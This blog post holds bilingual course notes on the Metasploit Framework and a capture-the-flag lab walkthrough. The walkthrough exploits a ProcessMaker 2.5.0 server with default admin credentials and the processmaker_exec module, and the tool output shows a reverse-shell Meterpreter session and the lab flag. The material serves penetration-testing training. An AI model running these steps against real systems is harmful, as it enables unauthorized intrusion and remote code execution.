---
layout: post
title: "The Metasploit Framework (MSF)"
date: "2023-04-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# The Metasploit Framework (MSF)
## The Metasploit Framework (MSF)
The Metasploit Framework (MSF) is an open-source, robust penetration testing and exploitation framework that is used by penetration testers and security researchers worldwide.

It provides penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle.

It is also used to develop and test exploits and has one of the world's largest database of public, tested exploits.

The Metasploit Framework is designed to be modular, allowing for new functionality to be implemented with ease.

## Essential Terminology
Interface - Methods of interacting with the Metasploit Framework.

Module - Pieces of code that perform a particular task, an example of a module is an exploit.

Vulnerability - Weakness or flaw in a computer system or network that can be exploited.

Exploit - Piece of code/module that is used to take advantage a vulnerability within a system, service or application.

Payload - Piece of code delivered to the target system by an exploit with the objective of executing arbitrary commands or providing remote access to an attacker.

Listener - A utility that listens for an incoming connection from a target.

## Metasploit Framework Console
The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all the functionality of the Metasploit Framework.

## Penetration Testing With MSF
The MSF can be used to perform and automate various tasks that fall under the penetration testing life cycle.

In order to understand how we can leverage the MSF for penetration testing, we need to explore the various phases of a penetration test and their respective techniques and objectives.

We can adopt the PTES (Penetration Testing Execution Standard) as a roadmap to understanding the various phases that make up a penetration test and how Metasploit can be integrated in to each phase.

|Penetration Testing Phase|Metasploit Framework Implementation|
|---|---|
|Information Gathering & Enumeration|Auxiliary Modules|
|Vulnerability Scanning|Auxiliary Modules|
|Exploitation|Exploit Modules & Payloads|
|Post Exploitation|Meterpreter|
|Privilege Escalation|Post Exploitation Modules, Meterpreter|
|Maintaining Persistent Access|Post Exploitation Modules, Persistence Modules|
	
# Metasploit Framework（MSF）
## Metasploit Framework（MSF）
Metasploit Framework（MSF）是一个开源、强大的渗透测试和利用框架，被全球的渗透测试人员和安全研究人员所使用。

它为渗透测试人员提供了一个强大的基础设施，以自动化渗透测试生命周期的每个阶段。

它还用于开发和测试利用工具，并拥有全球最大的公共测试利用数据库之一。

Metasploit Framework被设计为模块化，可以轻松实现新功能。

## 基本术语 
接口 - 与Metasploit Framework交互的方法。

模块 - 执行特定任务的代码块，例如利用模块。

漏洞 - 计算机系统或网络中可以被利用的弱点或缺陷。

利用工具 - 用于利用系统、服务或应用程序中的漏洞的代码/模块。

有效载荷 - 由利用工具传递到目标系统的代码块，旨在执行任意命令或为攻击者提供远程访问。

侦听器 - 从目标系统接收传入连接的实用程序。

## Metasploit Framework控制台 
Metasploit Framework控制台（MSFconsole）是一个易于使用的全功能界面，可让您访问Metasploit Framework的所有功能。

## 使用MSF进行渗透测试
MSF可用于执行和自动化属于渗透测试生命周期的各种任务。

为了了解如何利用MSF进行渗透测试，我们需要探索组成渗透测试的各个阶段及其各自的技术和目标。

我们可以采用PTES（渗透测试执行标准）作为了解组成渗透测试的各个阶段以及如何将Metasploit集成到每个阶段的路线图。

|渗透测试阶段|Metasploit Framework实现|
|---|---|
|信息收集和枚举|Auxiliary模块|
|漏洞扫描|Auxiliary模块|
|利用|利用模块和有效载荷|
|后期利用|Meterpreter|
|特权提升|后期利用模块，Meterpreter|
|维持持久访问|后期利用模块，持久化模块|

# Demo: The Metasploit Framework (MSF)（演示：Metasploit Framework（MSF））
With the Metasploit Framework, and when you'll be utilizing Meterpreter payloads, for example, you don't use a standard Netcat listener to receive the connection. You need to set up a multi-handler. A multi-handler is a specific Metasploit module that allows you to set up a listener for Metasploit Framework exploits or Metasploit Framework payloads. It can also be used to receive Netcat connections or just a connection from a standard reverse shell from the attacker system, or rather from the target system. But it's really for the purpose of payloads that are used with the Metasploit Framework.

Target IP Address: 10.4.23.85

The first logical step would be to perform an nmap scan to identify open ports and the respective services, as well as the service version of these services that are running on these open ports.

Perform a simple nmap scan on the default port range. So that is 1,000 of the most commonly scanned or used ports.

`-sV`: Perform service version detection.

```
nmap -sS -sV 10.4.23.85
```

As a beginner penetration tester, you may be tempted to perform vulnerability detection scan on the web server technology. In this case, that is Apache httpd. However, before you do that. I want you to explore the web server and the web application that's being hosted on the web server.

```
http://10.4.23.85
```

The name of the web application is ProcessMaker.

In order to gain access to this particular web application, we either need to log in, or we can view the page source to learn about it.

`Right Click->View Page Source`

The next step would be to search online for resources pertinent to default credentials for ProcessMaker.

In some cases, systems may be configured, and administrators don't change the default credentials for a third party solution like ProcessMaker.

```
Process Maker default credentials
```

If ProcessMaker was just installed and logging in for the first time, enter the following credentials to login as the administrator: User: admin. Password: admin.

Log in.

Remember, we still haven't identified the version of ProcessMaker that's running on the target.

`ADMIN`

`Settings->System information`

ProcessMaker Ver. 2.5.0

And it is utilizing a database, a relational database. And in this case, it's utilizing MySQL. And that's why when we perform the nmap scan, we were able to find that a MySQL database server is running. You're now starting to get an understanding of how various components that are being hosted on a system tie in together. That's why there is a database. It's for the purpose of this web application.

Now that we've identified the exact version of ProcessMaker, we can start searching for exploits pertinent to this specific version.

```
searchsploit ProcessMaker
```

Authenticated means that in order for this exploit, or Metasploit module to work, we need legitimate credentials.

What one would typically do is also use the `-w` option to display the ExploitDB links, so that you can go through the exploit code online.

```
searchsploit ProcessMaker -w
```

```
searchsploit ProcessMaker
```

We can get the source, or we can copy the Ruby Metasploit module and analyze it, or we can just open it up where it is.

```
cd Desktop/
```

And we'll just make a copy and analyze it locally.

```
searchsploit -m 29325
```

```
vim 29325.rb
rm 29325.rb
```

It looks like this module might work against version 2.5.

```
service postgresql start
```

That's going to start the PostgreSQL database service, because the Metasploit Framework typically interacts with the PostgreSQL database on the back end for storage of workspaces and exploit-related data.

```
msfconsole
```

Create a workspace for this particular exploitation. And this is a practice that I recommend that you do.

We'll create a workspace for this particular activity, so we can segregate our different projects that we're working on.

```
workspace -a ProcessMaker
workspace
```

This will ensure that your various engagements, or assessments, as a penetration tester, are sorted and kept separate from the other ones that you do.

For every new engagement always create a new workspace.

Search for the exploit.

```
search ProcessMaker
use exploit/multi/http/processmaker_exec
show options
set RHOSTS 10.4.23.85
exploit
```

We now have obtained initial access on the target system.

```
meterpreter > pwd
meterpreter > cd /
meterpreter > pwd
meterpreter > ls
meterpreter > cat flag.txt
```

From this point onwards you can start performing local enumeration, or the typical activities pertinent to post-exploitation.

But, I just wanted to showcase how you can utilize the Metasploit Framework for exploitation.

# Windows: Workflow Platform（Windows：工作流平台）
## Overview（概述）
A Kali GUI machine and a target machine running a vulnerable workflow platform server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target).  

Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module.

Objective: Exploit the application and retrieve the flag!

为您提供了一台 Kali GUI 机器和一台运行易受攻击的工作流平台服务器的目标机器。目标机器的 IP 地址在位于 Kali 机器桌面 (/root/Desktop/target) 上的名为 target 的文本文件中提供。  

您的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，然后使用适当的 Metasploit 模块利用该应用程序。

目标：利用应用程序并取回标志！

Instructions:
* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y. 
* The IP address of the target machine is mentioned in the file “/root/Desktop/target” 
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

## Solutions（解决方案）
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1946.pdf

Target IP Address : 10.0.24.188

Kali Linux : 10.10.21.4

```
root@attackdefense:~# nmap -sS -sV 10.0.24.188
Starting Nmap 7.70 ( https://nmap.org ) at 2023-04-22 20:32 IST
Nmap scan report for 10.0.24.188
Host is up (0.0024s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.2.23 ((Win32) PHP/5.2.14)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3306/tcp  open  mysql              MySQL (unauthorized)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.87 seconds
```

```
http://10.0.24.188/sys/en/neoclassic/login/login
```

```
If ProcessMaker was just installed and logging in for the first time, enter the following credentials to login as the administrator: User: admin. Password: admin.
```

![微信图片_20230422231348.png](/img/in-post/ine/微信图片_20230422231348.png)

![微信图片_20230422231253.png](/img/in-post/ine/微信图片_20230422231253.png)

```
root@attackdefense:~# searchsploit processmaker
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
ProcessMaker - Plugin Upload (Metasploit)                                                                                                            | exploits/php/webapps/44399.rb
ProcessMaker 3.0.1.7 - Multiple Vulnerabilities                                                                                                      | exploits/php/webapps/39872.txt
ProcessMaker Open Source - (Authenticated) PHP Code Execution (Metasploit)                                                                           | exploits/php/remote/29325.rb
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
root@attackdefense:~# searchsploit processmaker -w
------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                                                   |  URL
------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
ProcessMaker - Plugin Upload (Metasploit)                                                                                                        | https://www.exploit-db.com/exploits/44399
ProcessMaker 3.0.1.7 - Multiple Vulnerabilities                                                                                                  | https://www.exploit-db.com/exploits/39872
ProcessMaker Open Source - (Authenticated) PHP Code Execution (Metasploit)                                                                       | https://www.exploit-db.com/exploits/29325
------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Result
Papers: No Result
```

```
root@attackdefense:~# searchsploit -m 29325
  Exploit: ProcessMaker Open Source - (Authenticated) PHP Code Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/29325
     Path: /usr/share/exploitdb/exploits/php/remote/29325.rb
File Type: Ruby script, ASCII text, with CRLF line terminators

Copied to: /root/29325.rb
```

This module exploits a PHP code execution vulnerability in the 'neoclassic' skin for ProcessMaker Open Source which allows any authenticated user to execute PHP code. The vulnerable skin is installed by default in version 2.x and cannot be removed via the web interface.

该模块利用 ProcessMaker Open Source 的“新古典主义”皮肤中的 PHP 代码执行漏洞，允许任何经过身份验证的用户执行 PHP 代码。 易受攻击的皮肤默认安装在 2.x 版本中，无法通过 Web 界面删除。

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > workspace -a processmaker
[*] Added workspace: processmaker
[*] Workspace: processmaker
msf5 > workspace
  default
* processmaker
```

```
msf5 > search processmaker

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/processmaker_exec           2013-10-24       excellent  Yes    ProcessMaker Open Source Authenticated PHP Code Execution
   1  exploit/multi/http/processmaker_plugin_upload  2010-08-25       excellent  No     ProcessMaker Plugin Upload


msf5 > use exploit/multi/http/processmaker_exec
msf5 exploit(multi/http/processmaker_exec) > show options

Module options (exploit/multi/http/processmaker_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   admin            yes       The password for ProcessMaker
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   USERNAME   admin            yes       The username for ProcessMaker
   VHOST                       no        HTTP server virtual host
   WORKSPACE  workflow         yes       The ProcessMaker workspace


Exploit target:

   Id  Name
   --  ----
   0   ProcessMaker Open Source 2.x (PHP Payload)


msf5 exploit(multi/http/processmaker_exec) > set RHOSTS 10.0.24.188
RHOSTS => 10.0.24.188
```

```
msf5 exploit(multi/http/processmaker_exec) > exploit

[*] Started reverse TCP handler on 10.10.21.4:4444 
[*] Authenticating as user 'admin'
[+] Authenticated as user 'admin'
[*] Sending payload 'p9ASMadGHFa2rWFW5W.php' (1514 bytes)
[+] Payload sent successfully
[*] Retrieving file 'p9ASMadGHFa2rWFW5W.php'
[*] Sending stage (38288 bytes) to 10.0.24.188
[*] Meterpreter session 1 opened (10.10.21.4:4444 -> 10.0.24.188:49401) at 2023-04-22 21:00:42 +0530
[+] Deleted p9ASMadGHFa2rWFW5W.php

meterpreter > pwd
C:\Users\Administrator\AppData\Roaming\ProcessMaker-2_5_0\processmaker\workflow\public_html
meterpreter > cd /
meterpreter > pwd
C:\
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-09-10 15:20:33 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
40777/rwxrwxrwx   0       dir   2013-08-22 20:18:41 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2013-08-22 21:22:33 +0530  PerfLogs
40555/r-xr-xr-x   4096    dir   2020-08-12 09:43:47 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2020-09-15 19:29:49 +0530  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2020-09-05 14:35:45 +0530  ProgramData
40777/rwxrwxrwx   0       dir   2020-09-05 09:16:57 +0530  System Volume Information
40555/r-xr-xr-x   4096    dir   2020-09-10 15:20:27 +0530  Users
40777/rwxrwxrwx   24576   dir   2020-09-10 14:40:34 +0530  Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2020-09-15 19:26:18 +0530  flag.txt
100666/rw-rw-rw-  0       fil   2023-04-22 20:27:41 +0530  pagefile.sys

meterpreter > cat flag.txt
a3dcb4d229de6fde0db5686dee47145d
```